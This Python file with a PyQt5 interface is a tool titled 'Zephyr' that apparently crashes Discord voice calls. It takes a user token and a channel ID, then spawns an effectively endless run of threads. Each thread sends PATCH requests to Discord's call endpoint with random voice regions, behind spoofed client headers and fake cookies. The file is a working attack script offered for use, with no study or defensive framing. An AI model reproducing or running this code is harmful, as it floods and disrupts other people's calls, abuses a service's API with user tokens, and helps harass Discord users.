# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'untitled.ui'
#
# Created by: PyQt5 UI code generator 5.15.4
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.


from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import * 
from PyQt5.QtGui import * 
from PyQt5.QtCore import * 
import requests, os, random, threading,  sys
from threading import Thread

class Ui_Form(object):
        def setupUi(self, Form):
                Form.setObjectName("Form")
                Form.setWindowModality(QtCore.Qt.NonModal)
                Form.resize(257, 200)
                Form.setMinimumSize(QtCore.QSize(257, 200))
                Form.setMaximumSize(QtCore.QSize(257, 200))
                Form.setStyleSheet("background-color: rgb(36, 36, 36);")
                self.lineEdit_2 = QtWidgets.QLineEdit(Form)
                self.lineEdit_2.setGeometry(QtCore.QRect(10, 90, 231, 31))
                self.lineEdit_2.setStyleSheet("QLineEdit{\n"
        "    \n"
        "    color: rgb(255, 255, 255);\n"
        "    border-radius:10px;\n"
        "    background-color: rgb(47, 47, 47);\n"
        "    border: 1px solid rgb(0, 255, 238);\n"
        "}")
                self.lineEdit_2.setObjectName("lineEdit_2")
                self.lineEdit_3 = QtWidgets.QLineEdit(Form)
                self.lineEdit_3.setGeometry(QtCore.QRect(10, 30, 231, 31))
                self.lineEdit_3.setStyleSheet("QLineEdit{\n"
        "    \n"
        "    color: rgb(255, 255, 255);\n"
        "    border-radius:10px;\n"
        "    background-color: rgb(47, 47, 47);\n"
        "    border: 1px solid rgb(0, 255, 238);\n"
        "}")
                self.lineEdit_3.setObjectName("lineEdit_3")
                self.pushButton = QtWidgets.QPushButton(Form)
                self.pushButton.setGeometry(QtCore.QRect(50, 150, 141, 31))
                self.pushButton.setMinimumSize(QtCore.QSize(0, 0))
                self.pushButton.setMaximumSize(QtCore.QSize(10000000, 10000000))
                self.pushButton.setStyleSheet("QPushButton{\n"
        "    color: rgb(255, 255, 255);\n"
        "background-color: rgb(47, 47, 47);\n"
        "border-radius:10px;\n"
        "    border: 1px solid rgb(0, 255, 238);\n"
        "}\n"
        "QPushButton::hover{\n"
        "    \n"
        "    background-color: rgb(0, 190, 207);\n"
        "}\n"
        "QPushButton::pressed{\n"
        "    background-color: rgb(0, 168, 154);\n"
        "}")
                self.pushButton.setObjectName("pushButton")

                self.retranslateUi(Form)
                QtCore.QMetaObject.connectSlotsByName(Form)

        def retranslateUi(self, Form):
                _translate = QtCore.QCoreApplication.translate
                Form.setWindowTitle(_translate("Form", "Zephyr - Azulax#0511"))
                self.lineEdit_2.setToolTip(_translate("Form", "<html><head/><body><p>ID Channel</p></body></html>"))
                self.lineEdit_2.setText(_translate("Form", "ID CHANNEL"))
                self.lineEdit_3.setText(_translate("Form", "TOKEN"))
                self.pushButton.setText(_translate("Form", "Start"))
                self.pushButton.clicked.connect(self.Zephyr)

        def Zephyr(self):
                self.c_id = self.lineEdit_2.text()
                self.token = self.lineEdit_3.text()
                self.regions = ['india', 'brazil', 'europe', 'hongkong', 'japan', 'russia', 'singapore', 'southafrica', 'sydney', 'us-central', 'us-east','us-south', 'us-west']
                self.request_headers = {"Authorization": self.token, "accept": "*/*", "accept-language": "en-US", "connection": "keep-alive", "cookie": f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US', "DNT": "1", "origin": "https://discord.com", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "referer": "https://discord.com/channels/@me", "TE": "Trailers", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36", "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyZWxlYXNlX2NoYW5uZWwiOiJzdGFibGUiLCJjbGllbnRfdmVyc2lvbiI6IjEuMC45MDAxIiwib3NfdmVyc2lvbiI6IjEwLjAuMTkwNDIiLCJvc19hcmNoIjoieDY0Iiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiY2xpZW50X2J1aWxkX251bWJlciI6ODMwNDAsImNsaWVudF9ldmVudF9zb3VyY2UiOm51bGx9"}
                def crasher():
                        response = requests.patch(
                f"https://discord.com/api/v9/channels/{self.c_id}/call",
                headers = self.request_headers,
                json = {"region": random.choice(self.regions)},
                )
                for _ in range(10000000000000000):
                        Thread(target=crasher).start()


if __name__ == "__main__":
        import sys
        app = QtWidgets.QApplication(sys.argv)
        Form = QtWidgets.QWidget()
        ui = Ui_Form()
        ui.setupUi(Form)
        Form.show()
        sys.exit(app.exec_())
